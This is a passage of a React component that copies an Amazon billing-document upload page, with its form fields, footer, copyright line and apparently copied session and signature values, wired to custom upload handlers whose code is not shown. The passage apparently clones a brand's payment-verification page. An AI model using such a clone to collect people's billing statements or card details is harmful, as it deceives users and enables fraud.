                            className="a-declarative"
                            data-action="a-sheet"
                            data-csa-c-type="widget"
                            data-csa-c-func-deps="aui-da-a-sheet"
                            data-a-sheet='{"name":"radio-18-document-type-0-1","preloadDomId":"radio-18-document-type-0-1"}'
                            ><a
                              href="/"
                              role="button"
                              className="a-popover-trigger a-declarative"
                              >Details<i className="a-icon a-icon-popover"></i></a
                          ></span>
                          <div id="radio-18-document-type-0-1" className="hidden">
                            <div className="a-container">
                              <div className="a-section a-spacing-small">
                                <h1 className="a-size-medium a-text-bold">
                                  Attaching a billing statement
                                </h1>
                              </div>
                              <div className="a-section a-spacing-none">
                                <span
                                  >The following information must be clearly
                                  displayed on the statement:</span
                                >
                                <ol className="a-ordered-list a-vertical">
                                  <li>
                                    <span className="a-list-item"
                                      >Your name and billing address</span
                                    >
                                  </li>
                                  <li>
                                    <span className="a-list-item"
                                      >Phone number (if included in your billing
                                      statement)</span
                                    >
                                  </li>
                                  <li>
                                    <span className="a-list-item"
                                      >Last 4 digits of the card or account
                                      number</span
                                    >
                                  </li>
                                </ol>
                              </div>
                            </div>
                          </div>
                        </span></label
                      >
                    </div>
                  </div>
                  <div className="a-section a-spacing-small sub-radio-option">
                    <div className="a-section a-spacing-none">
                      <div
                        className="a-box a-alert-inline a-alert-inline-info inline-alert a-spacing-top-small"
                        aria-live="polite"
                        aria-atomic="true"
                      >
                        <div className="a-box-inner a-alert-container">
                          <i className="a-icon a-icon-alert"></i>
                          <div className="a-alert-content">
                            Please ensure ONLY the last four digits of the card
                            are visible.<br />For your security, do NOT include
                            full card or account numbers.
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    className="a-section a-spacing-none a-padding-small radio-option highlight-on"
                  >
                    <div
                      data-a-input-name="document-type"
                      data-validation-config='{"name":"document","error-message":"Remove the attached document to select this option","matcher":"empty"}'
                      className="a-radio a-radio-fancy a-control-row a-touch-radio validate-on-select"
                    >
                      <label className=""
                        ><input
                          type="radio"
                          name="document-type"
                          value="unable-to-attach"
                          onChange={handleRadioChange}
                        /><i className="a-icon a-icon-radio"></i
                        ><span className="a-label a-radio-label"
                          >Unable to attach a document</span
                        ></label
                      >
                    </div>
                  </div>
                  <div
                    data-target-value="unable-to-attach"
                    className="a-section a-spacing-small sub-radio-option radio-value-listener hidden"
                  >
                    <div
                      data-a-input-name="no-document-reason"
                      className="a-radio a-radio-fancy a-control-row a-touch-radio a-spacing-top-small"
                    >
                      <label
                        ><input
                          type="radio"
                          name="no-document-reason"
                          value="other"
                          onChange={handleRadioChange}
                        /><i className="a-icon a-icon-radio"></i
                        ><span className="a-label a-radio-label">Other</span></label
                      >
                    </div>
                    <div
                      data-a-input-name="no-document-reason"
                      className="a-radio a-radio-fancy a-control-row a-touch-radio a-spacing-top-small"
                    >
                      <label
                        ><input
                          type="radio"
                          name="no-document-reason"
                          value="do-not-have"
                          onChange={handleRadioChange}
                        /><i className="a-icon a-icon-radio"></i
                        ><span className="a-label a-radio-label"
                          >I don't have a document</span
                        ></label
                      >
                    </div>
                    <div
                      data-a-input-name="no-document-reason"
                      className="a-radio a-radio-fancy a-control-row a-touch-radio a-spacing-top-small"
                    >
                      <label
                        ><input
                          type="radio"
                          name="no-document-reason"
                          value="do-not-want-to-share"
                          onChange={handleRadioChange}
                        /><i className="a-icon a-icon-radio"></i
                        ><span className="a-label a-radio-label"
                          >I don't want to share my document</span
                        ></label
                      >
                    </div>
                    <div
                      data-a-input-name="no-document-reason"
                      className="a-radio a-radio-fancy a-control-row a-touch-radio a-spacing-top-small"
                    >
                      <label
                        ><input
                          type="radio"
                          name="no-document-reason"
                          value="do-not-know-how-to-attach"
                          onChange={handleRadioChange}
                        /><i className="a-icon a-icon-radio"></i
                        ><span className="a-label a-radio-label"
                          >I don't know how to attach a document</span
                        ></label
                      >
                    </div>
                  </div>
                  <div
                    id="document-type-error-content"
                    className="a-section a-spacing-none hidden"
                  >
                    <div
                      className="a-box a-alert-inline a-alert-inline-error"
                      role="alert"
                    >
                      <div className="a-box-inner a-alert-container">
                        <i className="a-icon a-icon-alert"></i>
                        <div className="a-alert-content">
                          <span className="error-message"></span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div
              id="header-19"
              className="a-section a-spacing-mini abbott-view-component component-width-extra_large component-display-block block"
            >
              <h1
                data-action-on-load="register-listeners"
                data-listeners='[{"name":"document-type","toggle":"block","matcher":"not_in","values":["unable-to-attach"]}]'
                className="a-size-base has-action-on-load text-align-left a-text-bold"
              >
                Document upload
              </h1>
            </div>

            <div
              id="text-20"
              className="a-section a-spacing-base abbott-view-component component-width-extra_large component-display-block block"
            >
              <span
                data-action-on-load="register-listeners"
                data-listeners='[{"name":"document-type","toggle":"block","matcher":"not_in","values":["unable-to-attach"]}]'
                className="a-size-base has-action-on-load text-align-left"
                ><span className="a-size-mini a-color-tertiary a-text-normal"
                  >Supported file types: jpg, pdf, png, tif. Maximum number of
                  files: 5. Maximum file size: 15MB.</span
                ></span
              >
            </div>

            <div
              id="file-upload-21"
              className="a-section a-spacing-medium abbott-view-component component-width-extra_large component-display-block block"
            >
              <div
                data-name="document"
                className="a-section a-spacing-none file-upload"
              >
                
                <div
                  id="document-select-file-box"
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"document-type","toggle":"block","matcher":"not_in","values":["unable-to-attach"]}]'
                  className="a-section has-action-on-load"
                >
                  <div className="button-content">
                    <span
                      onClick={selectFiles}
                      role='button'
                      id="document-select-file-button"
                      className="a-button a-button-base file-upload-button"
                    >
                      <span className="a-button-inner">
                        <span
                          id="document-select-file-button-announce"
                          className="a-button-text"
                          aria-hidden="true"
                        >
                          <span className="text">
                            <i className="file-upload-icon">
                              <svg
                                className="icon"
                                viewBox="0 0 24.01 20.48"
                                focusable="false"
                                role="presentation"
                                stroke="currentColor"
                                aria-hidden="true"
                              >
                                <path
                                  d="M12.69,1.12a.82.82,0,0,0-.54.25L6.2,7.6a.76.76,0,0,0-.2.78.8.8,0,0,0,.62.54.83.83,0,0,0,.78-.27L11.94,3.9V16a.78.78,0,0,0,.75.8.89.89,0,0,0,.87-.8V3.9L18.1,8.67a.83.83,0,0,0,.78.27.8.8,0,0,0,.62-.54.76.76,0,0,0-.2-.78L13.35,1.37A.83.83,0,0,0,12.69,1.12ZM1.54,13.28a.79.79,0,0,0-.57.25.85.85,0,0,0-.23.6V20.8a.82.82,0,0,0,.81.8H24a.82.82,0,0,0,.8-.83V14.13a.84.84,0,0,0-.4-.73.77.77,0,0,0-.81,0,.84.84,0,0,0-.4.73V20H2.35V14.13a.85.85,0,0,0-.23-.6A.78.78,0,0,0,1.54,13.28Z"
                                  transform="translate(-0.74 -1.12)"
                                ></path>
                              </svg>
                            </i>
                            Choose file</span
                          >
                        </span>
                        <input type="file" onChange={onFileSelect} hidden id='file-input' multiple ref={fileInputRef}/>
                      </span>
                    </span>
                  </div>
                </div>
                <input
                  type="hidden"
                  id="document-selected-file-names"
                  name="document-selected-file-names"
                  value=""
                  spellCheck="false"
                />
                <input
                  type="hidden"
                  id="document-names"
                  name="document-names"
                  value=""
                  spellCheck="false"
                />
                <input
                  type="hidden"
                  id="document-ids"
                  name="document-ids"
                  value=""
                  spellCheck="false"
                />
                {
                  isImage && <div
                  className="a-section a-spacing-none mt-8"
                >
                  <div
                    className="a-box a-alert-inline a-alert-inline-error"
                    role="alert"
                  >
                    <div className="a-box-inner a-alert-container">
                      <i className="a-icon a-icon-alert"></i>
                      <div className="a-alert-content">
                        <span className="error-message"> Select a document type above</span>
                      </div>
                    </div>
                  </div>
                </div>
                }
                <div
                  id="document-file-rows"
                  className="a-section a-spacing-none file-row-content"
                ></div>

                  {images && images?.map((images, index) => (
                    <div id="document-file-rows" className="a-section a-spacing-none file-row-content" key={index}>
                      <div className="a-fixed-right-grid file-row">
                        <div className="a-fixed-right-grid-inner drop1">
                          <div className="a-fixed-right-grid-col file-name a-col-left drop2">
                           <span>{images.name}</span>
                          </div>
                           <div className="a-text-right a-fixed-right-grid-col delete-file a-col-right drop3" 
                             onClick={() => deleteImage(index)}>
                             <i className="a-icon a-icon-close" role="presentation"></i>
                            </div>
                          </div>
                       </div>
                    </div>
                        ))}

              </div>
            </div>

            <div
              id="text-22"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <span
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left"
                >Please don't upload password protected files.</span
              >
            </div>

            <div
              id="toggle-23"
              className="a-section a-spacing-large abbott-view-component component-display-block component-width-extra_large"
            >
              <a
                data-action-on-load="toggle-components"
                data-target-components='{"comments-text-area":"block","comments-disclaimer-text":"block"}'
                data-toggle-component="none"
                className="a-size-base a-link-normal toggle-components-link text-align-left"
                href="/"
                >Add Comments</a
              >
            </div>

            <div
              id="comments-text-area"
              className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label">Comments (optional)</label>
                <div
                  data-action-on-load="register-listeners"
                  data-listeners=""
                  className="a-input-text-wrapper a-form-normal input-field-width has-action-on-load"
                >
                  <textarea
                    value={comment}
                    onChange={handleChangeComment}
                    maxLength="200"
                    placeholder="Anything else you want us to know about this order payment?"
                    rows="2"
                    name="comments"
                    className="a-form-normal"
                    id="a-form-control-auto-id-0"
                  ></textarea>
                </div>
              </div>
            </div>

            <div
              id="comments-disclaimer-text"
              className="a-section a-spacing-extra-large abbott-view-component component-display-none component-width-extra_large"
            >
              <span
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left"
                >NOTE: We aren’t able to offer policy exceptions in response to
                comments. Do not include personal information in these
                comments.</span
              >
            </div>

            <div
              id="submit-button-26"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <div
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-section has-action-on-load content-align-center"
              >
                <span
                  id="submit-button"
                  onClick={handleUpload}
                  className="a-button a-button-primary button-default-width"
                  ><span className="a-button-inner"
                    ><input
                      className="a-button-input"
                      type="submit"
                      aria-labelledby="submit-button-announce"
                    /><span
                      id="submit-button-announce"
                      className="a-button-text"
                      aria-hidden="true"
                      >Submit billing details &amp; document</span
                    ></span
                  ></span
                >
              </div>
            </div>
          </form>
        </div>
      </div>
      <div className="a-section abbott-view-footer">
        <div className="a-section a-spacing-none">
          <div className="a-section abbott-view-component">
            <div
              className="a-section a-spacing-extra-large a-spacing-top-extra-large"
            >
              <div className="a-divider a-divider-section">
                <div className="a-divider-inner"></div>
              </div>
              <div className="a-section">
                <div className="a-section a-text-center a-spacing-small">
                  <a
                    className="a-size-mini a-link-normal a-padding-mini"
                    href="https://www.amazon.com/gp/help/customer/display.html/?ie=UTF8&amp;nodeId=508088"
                    >Conditions of Use</a
                  ><a
                    className="a-size-mini a-link-normal a-padding-mini"
                    href="https://www.amazon.com/gp/help/customer/display.html/?ie=UTF8&amp;nodeId=468496"
                    >Privacy Notice</a
                  ><a
                    className="a-size-mini a-link-normal a-padding-mini"
                    href="https://www.amazon.com/gp/help/customer/display.html"
                    >Help</a
                  >
                </div>
                <div
                  className="a-section a-text-center a-size-mini a-color-secondary"
                >
                  © 1996-2024, Amazon.com, Inc. or its affiliates.
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="a-popover-root" className='style1'></div>

    <div className="submit-loading submit-loading-off">
      <div className="spinner-container"><span className="spinner-img"></span></div>
    </div>
    <div className='display-none'>
      <form
        id="document-form"
        method="post"
        action="/documents/upload/v2"
        encType="multipart/form-data"
      >
        <input type="hidden" name="_utf8_enable" value="â" />
        <input
          type="hidden"
          name="AX-SessionID"
          value="147-8161987-7029916"
          spellCheck="false"
        />
        <input
          type="hidden"
          name="AX-Destination"
          value="/documents/uploaded"
          spellCheck="false"
        />
        <input
          type="hidden"
          name="AX-DocumentDisposition"
          value="file1=urn:alx:cls:c23a2b35-7b13-4aa5-afcb-9a12190bdd4b,file2=urn:alx:cls:c23a2b35-7b13-4aa5-afcb-9a12190bdd4b,file3=urn:alx:cls:c23a2b35-7b13-4aa5-afcb-9a12190bdd4b,file4=urn:alx:cls:c23a2b35-7b13-4aa5-afcb-9a12190bdd4b,file5=urn:alx:cls:c23a2b35-7b13-4aa5-afcb-9a12190bdd4b"
          spellCheck="false"
        />
        <input
          type="hidden"
          name="AX-Signature"
          value="SHA256-RSA-V1,18e047ab55d,384,urn:alx:uid:aa560e48-44f7-4ecf-ab18-b5c0e5f729c2,1,06732862a9c3f97e6e9c989b679b6ea8dc9b38e82c7c757bdb9436fae7a105c850ff694626331de59b5a7ab14f77aa774473d76b59a4a81e2578e2bf1a40c832b29c26a7f4b347198824f9bff65e3f367223b4a2ba2b283a238b85f6192c9d090c205a0065de3545b0659968a73b3bf6b0cae81dfbaebae06d3a281575709d6c78a77822eb87b42153b28e798b4531ec5441e9fbf1f6c2dfd9bba7a2cb929b263e5812807bed86ae378b0244c9bfb7d07333fe7389b9e7307050302f974782eba54173a391d69bbd7c9c8af470ddf50e1f477a4206d520a247371ae3c5692ff8fe22379c5536b1c24b64addd1ac67345af692a5b3475b53ca16e6e861b557023"
          spellCheck="false"
        />
      </form>
    </div>
    <div id="a-white"></div>
    <div
      className="a-popover a-dropdown a-dropdown-common a-declarative style2"
      aria-modal="true"
      data-action="a-popover-a11y"
      id="a-popover-1"
      aria-hidden="true"
    >
      <span
        tabIndex="0"
        className="a-popover-start a-popover-a11y-offscreen"
      ></span>
      <div className="a-popover-wrapper">
        <div
          data-action="a-popover-header"
          className="a-popover-header a-declarative"
        >
          <h4 id="a-popover-header-1" className="a-popover-header-content"></h4>
          <button
            data-action="a-popover-close"
            className="a-button-close a-declarative"
            aria-label="Close"
          >
            <i className="a-icon a-icon-close"></i>
          </button>
        </div>
        <div
          data-action="a-popover-scroll"
          className="a-popover-inner a-declarative style3"
        >

        </div>
      </div>
      <span tabIndex="0" className="a-popover-end a-popover-a11y-offscreen"></span>
    </div>
    <div
      id="a-popover-lgtbox"
      className="a-declarative style4"
      data-action="a-popover-floating-close"
    ></div>
    </>
  )
}
